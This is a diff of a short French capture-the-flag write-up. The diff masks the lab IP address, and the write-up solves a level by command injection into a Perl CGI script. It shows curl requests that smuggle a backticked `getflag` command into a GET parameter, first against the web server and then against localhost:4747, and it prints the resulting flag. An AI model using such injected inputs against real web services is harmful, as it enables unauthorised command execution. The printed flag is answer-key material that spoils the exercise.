@@ -2,7 +2,7 @@ On nous propose un script perl
 L’utilisation de CGI qw{param} laisse la possibilité d’y mettre ce qu’on veut depuis un formulaire .plx
 
 On à acces à l’url, ip machine
-http://192.168.1.19
+http://192.XXX.1.19
 
 Le dossier de travail apache se situ ici: /var/www on retrouve bien level04.
 
@@ -10,17 +10,17 @@ On ne peut pas écrire dans se dossier ni modifier cgi.
 
 On peut cela dit, envoyer des valeurs en ‘get’ directement au script perl comme ceci: 
 
-./level04 http://192.168.1.19/level04/level04.pl?x=toto
+./level04 http://192.XXX.1.19/level04/level04.pl?x=toto
 Print toto.
 
-./level04 http://192.168.1.19/level04/level04.pl?x=`getflag` 
+./level04 http://192.XXX.1.19/level04/level04.pl?x=`getflag` 
 Seul Check est affiché
 
-curl 'http://192.168.1.19/level04/level04.pl?x=`getflag`'
+curl 'http://192.XXX.1.19/level04/level04.pl?x=`getflag`'
 Ne donne rien mais dans le script, il y à une annotation as code : # localhost:4747
 
 On retourne voir la config de apache et dans /etc/apache2/sites-enabled/level05.conf 
 	on voit bien qu’un localhost:4747 pointe sur level04.pl
 
-On url dessus de la même manière que précédemment, on oubli pas les ‘’:  curl 'localhost:4747?x=`getflag`'
+On url dessus de la même manière que précédemment, on oubli pas les ‘’: curl 'localhost:4747?x=`getflag`'
 Cette fois on à acces au flag: ne2searoevaevoem4ov4ar8ap
